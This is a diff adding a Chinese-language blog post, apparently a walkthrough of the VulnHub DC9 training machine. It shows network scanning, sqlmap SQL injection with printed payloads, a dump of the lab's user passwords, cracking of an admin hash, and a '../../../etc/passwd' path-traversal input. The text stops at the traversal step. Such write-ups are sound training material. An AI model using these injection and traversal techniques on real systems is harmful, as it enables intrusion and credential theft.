@@ -5,10 +5,10 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 8.1.1">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-128.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16.png">
+  <link rel="mask-icon" href="/images/favicon-128.png" color="#222">
 
 <link rel="stylesheet" href="/css/main.css">
 
@@ -181,6 +181,277 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/03/%E9%9D%B6%E6%9C%BA/vulnhub/DC9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/saber.jpg">
+      <meta itemprop="name" content="zhaochoudecat">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zhaochoudecat">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/05/03/%E9%9D%B6%E6%9C%BA/vulnhub/DC9/" class="post-title-link" itemprop="url">DC9</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2026-05-03 00:00:00 / 修改时间：04:03:51" itemprop="dateCreated datePublished" datetime="2026-05-03T00:00:00+08:00">2026-05-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶机</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA/vulnhub/" itemprop="url" rel="index"><span itemprop="name">vulnhub</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="1-探测"><a href="#1-探测" class="headerlink" title="1.探测"></a>1.探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# arp-scan -l             </span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:dc:17:7e, IPv4: 192.168.3.43</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.3.1     18:d9:8f:c8:68:38       Huawei Device Co., Ltd.</span><br><span class="line">192.168.3.4     00:e0:4c:4d:2a:68       REALTEK SEMICONDUCTOR CORP.</span><br><span class="line">192.168.3.5     b4:2e:99:cc:28:45       GIGA-BYTE TECHNOLOGY CO.,LTD.</span><br><span class="line">192.168.3.45    08:00:27:95:4e:a9       PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/Pasted%20image%2020260110175100.png"></p>
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# nmap -p- 192.168.3.45              </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-10 17:51 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.3.45</span><br><span class="line">Host is up (0.00072s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE    SERVICE</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp open     http</span><br><span class="line">MAC Address: 08:00:27:95:4E:A9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>注意到22端口被<code>filtered</code>了</li>
+</ul>
+<h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# dirsearch -u http://192.168.3.45/index.php</span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /root/localkali/testpayload/reports/http_192.168.3.45/_index.php_26-01-10_17-58-52.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.3.45/</span><br><span class="line"></span><br><span class="line">[17:58:52] Starting: index.php/</span><br><span class="line">[17:58:53] 404 -  274B  - /index.php/%2e%2e//google.com</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+<p>无有用的信息</p>
+<hr>
+<h2 id="2-sqlmap"><a href="#2-sqlmap" class="headerlink" title="2.sqlmap"></a>2.sqlmap</h2><p>发现search页面，可以输入，推测有注入点<br><img src="/assets/Pasted%20image%2020260110180142.png"><br>注意到post请求，页面url没变，同时burp也有提示post请求，这时有两个方法去测试sqlmap注入<br><img src="/assets/Pasted%20image%2020260110180103.png"></p>
+<hr>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# sqlmap -u http://192.168.3.45/results.php --data <span class="string">&quot;search =1&quot;</span> --leve=5 --batch</span><br></pre></td></tr></table></figure>
+<ul>
+<li>首先<code>url</code>注意是<code>results</code>, 可以看到<code>burp</code>里的<code>post</code>提交路径</li>
+<li>因为是<code>post</code>请求，因此需要加上<code>--data</code>，<code>--level=5</code>检查更严格(可以不加)</li>
+</ul>
+<p>发现<strong>search</strong>注入漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# sqlmap -u http://192.168.3.45/results.php --data <span class="string">&quot;search=1&quot;</span>  --batch </span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.9.11#stable&#125;</span><br><span class="line">|_ -| . [.]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [&#x27;</span>]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 18:09:40 /2026-01-10/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[18:09:40] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[18:09:40] [INFO] testing if the target URL content is stable</span></span><br><span class="line"><span class="string">[18:09:40] [INFO] target URL content is stable</span></span><br><span class="line"><span class="string">[18:09:40] [INFO] testing if POST parameter &#x27;</span>search<span class="string">&#x27; is dynamic</span></span><br><span class="line"><span class="string">[18:09:40] [WARNING] POST parameter &#x27;</span>search<span class="string">&#x27; does not appear to be dynamic</span></span><br><span class="line"><span class="string">[18:09:40] [WARNING] heuristic (basic) test shows that POST parameter &#x27;</span>search<span class="string">&#x27; might not be injectable</span></span><br><span class="line"><span class="string">[18:09:40] [INFO] testing for SQL injection on POST parameter &#x27;</span>search<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:40] [INFO] testing &#x27;</span>AND boolean-based blind - WHERE or HAVING clause<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>Boolean-based blind - Parameter replace (original value)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>PostgreSQL AND error-based - WHERE or HAVING clause<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>Oracle AND error-based - WHERE or HAVING clause (XMLType)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>Generic inline queries<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>PostgreSQL &gt; 8.1 stacked queries (comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>Microsoft SQL Server/Sybase stacked queries (comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:09:41] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:10:01] [INFO] POST parameter &#x27;</span>search<span class="string">&#x27; appears to be &#x27;</span>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<span class="string">&#x27; injectable </span></span><br><span class="line"><span class="string">it looks like the back-end DBMS is &#x27;</span>MySQL<span class="string">&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span></span><br><span class="line"><span class="string">for the remaining tests, do you want to include all tests for &#x27;</span>MySQL<span class="string">&#x27; extending provided level (1) and risk (1) values? [Y/n] Y</span></span><br><span class="line"><span class="string">[18:10:01] [INFO] testing &#x27;</span>Generic UNION query (NULL) - 1 to 20 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:10:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span></span><br><span class="line"><span class="string">[18:10:01] [INFO] target URL appears to be UNION injectable with 6 columns</span></span><br><span class="line"><span class="string">[18:10:01] [INFO] POST parameter &#x27;</span>search<span class="string">&#x27; is &#x27;</span>Generic UNION query (NULL) - 1 to 20 columns<span class="string">&#x27; injectable</span></span><br><span class="line"><span class="string">POST parameter &#x27;</span>search<span class="string">&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: search (POST)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27;</span> AND (SELECT 6494 FROM (SELECT(SLEEP(5)))FPWe) AND <span class="string">&#x27;ggNh&#x27;</span>=<span class="string">&#x27;ggNh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27;</span> UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162766271,0x44615268716e726b6e4966415575447a42676848597962535a79756e45646241566547736e654f66,0x7170786271),NULL,NULL-- -</span><br><span class="line">---</span><br><span class="line">[18:10:01] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Debian 10 (buster)</span><br><span class="line">web application technology: Apache 2.4.38</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span><br><span class="line">[18:10:01] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.3.45&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>将<code>burp</code>的抓包直接复制到<code>kali</code>的<code>a.txt</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# cat a.txt </span><br><span class="line">POST /results.php HTTP/1.1</span><br><span class="line">Host: 192.168.3.45</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8</span><br><span class="line">Origin: http://192.168.3.45</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.3.45/search.php</span><br><span class="line">Cookie: PHPSESSID=um35hfg1i6v2rdrtie01kp5u2b</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">search=1</span><br></pre></td></tr></table></figure>
+
+<p>然后用<code>sqlmap -l</code> 指定</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─ sqlmap -l a.txt --batch </span><br><span class="line"><span class="comment">#运行结果上面一致</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="爆破库"><a href="#爆破库" class="headerlink" title="爆破库"></a>爆破库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─ sqlmap -l a.txt --batch --dbs</span><br><span class="line">[18:15:12] [INFO] fetching database names</span><br><span class="line">available databases [3]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] Staff</span><br><span class="line">[*] <span class="built_in">users</span></span><br></pre></td></tr></table></figure>
+<p>有两个表<code>Staff</code> 和 <code>users</code>，<code>information_schema</code>是<code>mysql</code>自带的不用管 </p>
+<h3 id="查看库中的表"><a href="#查看库中的表" class="headerlink" title="查看库中的表"></a>查看库中的表</h3><p>先看<code>users</code>库，有一个<code>UserDetails</code> 表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─ sqlmap -l a.txt --batch -D <span class="built_in">users</span> --tables</span><br><span class="line">[18:17:09] [INFO] fetching tables <span class="keyword">for</span> database: <span class="string">&#x27;users&#x27;</span></span><br><span class="line">Database: <span class="built_in">users</span></span><br><span class="line">[1 table]</span><br><span class="line">+-------------+</span><br><span class="line">| UserDetails |</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看表中的字段"><a href="#查看表中的字段" class="headerlink" title="查看表中的字段"></a>查看表中的字段</h3><p>先看下 <code>UserDetails</code>表中的字段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─ sqlmap -l a.txt --batch -D <span class="built_in">users</span> -T UserDetails --columns</span><br><span class="line">[18:21:24] [INFO] fetching columns <span class="keyword">for</span> table <span class="string">&#x27;UserDetails&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;users&#x27;</span></span><br><span class="line">Database: <span class="built_in">users</span></span><br><span class="line">Table: UserDetails</span><br><span class="line">[6 columns]</span><br><span class="line">+-----------+-----------------+</span><br><span class="line">| Column    | Type            |</span><br><span class="line">+-----------+-----------------+</span><br><span class="line">| firstname | varchar(30)     |</span><br><span class="line">| <span class="built_in">id</span>        | int(6) unsigned |</span><br><span class="line">| lastname  | varchar(30)     |</span><br><span class="line">| password  | varchar(20)     |</span><br><span class="line">| reg_date  | timestamp       |</span><br><span class="line">| username  | varchar(30)     |</span><br><span class="line">+-----------+-----------------+</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="查看指定字段的数据"><a href="#查看指定字段的数据" class="headerlink" title="查看指定字段的数据"></a>查看指定字段的数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─ sqlmap -l a.txt --batch -D <span class="built_in">users</span> -T UserDetails -C <span class="string">&quot;username,password&quot;</span> --dump</span><br><span class="line"></span><br><span class="line">[18:23:53] [INFO] fetching entries of column(s) <span class="string">&#x27;password,username&#x27;</span> <span class="keyword">for</span> table <span class="string">&#x27;UserDetails&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;users&#x27;</span></span><br><span class="line">Database: <span class="built_in">users</span></span><br><span class="line">Table: UserDetails</span><br><span class="line">[17 entries]</span><br><span class="line">+-----------+---------------+</span><br><span class="line">| username  | password      |</span><br><span class="line">+-----------+---------------+</span><br><span class="line">| marym     | 3kfs86sfd     |</span><br><span class="line">| julied    | 468sfdfsd2    |</span><br><span class="line">| fredf     | 4sfd87sfd1    |</span><br><span class="line">| barneyr   | RocksOff      |</span><br><span class="line">| tomc      | TC&amp;TheBoyz    |</span><br><span class="line">| jerrym    | B8m#48sd      |</span><br><span class="line">| wilmaf    | Pebbles       |</span><br><span class="line">| bettyr    | BamBam01      |</span><br><span class="line">| chandlerb | UrAG0D!       |</span><br><span class="line">| joeyt     | Passw0rd      |</span><br><span class="line">| rachelg   | yN72#dsd      |</span><br><span class="line">| rossg     | ILoveRachel   |</span><br><span class="line">| monicag   | 3248dsds7s    |</span><br><span class="line">| phoebeb   | smellycats    |</span><br><span class="line">| scoots    | YR3BVxxxw87   |</span><br><span class="line">| janitor   | Ilovepeepee   |</span><br><span class="line">| janitor2  | Hawaii-Five-0 |</span><br><span class="line">+-----------+---------------+</span><br><span class="line"></span><br><span class="line">[18:23:53] [INFO] table <span class="string">&#x27;users.UserDetails&#x27;</span> dumped to CSV file <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.3.45/dump/users/UserDetails.csv&#x27;</span></span><br><span class="line">[18:23:53] [INFO] you can find results of scanning <span class="keyword">in</span> multiple targets mode inside the CSV file <span class="string">&#x27;/root/.local/share/sqlmap/output/results-01102026_0623pm.csv&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="将数据保存下来"><a href="#将数据保存下来" class="headerlink" title="将数据保存下来"></a>将数据保存下来</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─ <span class="built_in">cat</span> /root/.local/share/sqlmap/output/192.168.3.45/dump/users/UserDetails.csv | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; user.txt</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─<span class="built_in">cat</span> /root/.local/share/sqlmap/output/192.168.3.45/dump/users/UserDetails.csv | awk -F, <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> &gt; pass.txt</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# <span class="built_in">cat</span> user.txt                                                                                                  </span><br><span class="line">username</span><br><span class="line">marym</span><br><span class="line">julied</span><br><span class="line">fredf</span><br><span class="line">barneyr</span><br><span class="line">tomc</span><br><span class="line">jerrym</span><br><span class="line">wilmaf</span><br><span class="line">bettyr</span><br><span class="line">chandlerb</span><br><span class="line">joeyt</span><br><span class="line">rachelg</span><br><span class="line">rossg</span><br><span class="line">monicag</span><br><span class="line">phoebeb</span><br><span class="line">scoots</span><br><span class="line">janitor</span><br><span class="line">janitor2</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看Staff库"><a href="#查看Staff库" class="headerlink" title="查看Staff库"></a>查看Staff库</h3><p>同样的方法查看<code>Staff</code>库中的数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# sqlmap -l a.txt -D Staff --tables --batch</span><br><span class="line">[18:30:11] [INFO] fetching tables <span class="keyword">for</span> database: <span class="string">&#x27;Staff&#x27;</span></span><br><span class="line">Database: Staff</span><br><span class="line">[2 tables]</span><br><span class="line">+--------------+</span><br><span class="line">| StaffDetails |</span><br><span class="line">| Users        |</span><br><span class="line">+--------------+</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# sqlmap -l a.txt -D Staff -T Users --columns --batch </span><br><span class="line">[18:31:46] [INFO] fetching columns <span class="keyword">for</span> table <span class="string">&#x27;Users&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;Staff&#x27;</span></span><br><span class="line">Database: Staff</span><br><span class="line">Table: Users</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+-----------------+</span><br><span class="line">| Column   | Type            |</span><br><span class="line">+----------+-----------------+</span><br><span class="line">| Password | varchar(255)    |</span><br><span class="line">| UserID   | int(6) unsigned |</span><br><span class="line">| Username | varchar(255)    |</span><br><span class="line">+----------+-----------------+</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# sqlmap -l a.txt --batch -D Staff -T Users -C <span class="string">&quot;Username,Password&quot;</span> --dump </span><br><span class="line">Database: Staff</span><br><span class="line">Table: Users</span><br><span class="line">[1 entry]</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| Username | Password                         |</span><br><span class="line">+----------+----------------------------------+</span><br><span class="line">| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |</span><br><span class="line">+----------+----------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p><code>password</code>看上去是<code>md5</code>，<code>somd5.com</code>在线爆破一下，结果是<code>transorbital1</code><br><img src="/assets/Pasted%20image%2020260110183639.png"></p>
+<h2 id="3-登录"><a href="#3-登录" class="headerlink" title="3.登录"></a>3.登录</h2><p>登录进来发现只是多了几个按钮，增加记录，没有什么作用<br><img src="/assets/Pasted%20image%2020260110183945.png"></p>
+<h3 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="&#x2F;etc&#x2F;passwd"></a>&#x2F;etc&#x2F;passwd</h3><p>找到<code>file</code>真实路径,下面只是演示<br><img src="/assets/Pasted%20image%2020260110184446.png"><br>手动添加<code>payload</code>, 如<code>../../../etc/passwd</code><br><img src="/assets/Pasted%20image%2020260110184612.png"><br>可以看到在<code>../../../../etc/passwd</code> 时<code>length</code>开始变化, 找到真实路径<br><img src="/assets/Pasted%20image%2020260110184828.png"><br>或者<code>url</code>上面多加一些根目录也是可以的<br><img src="/assets/Pasted%20image%2020260110185038.png"></p>
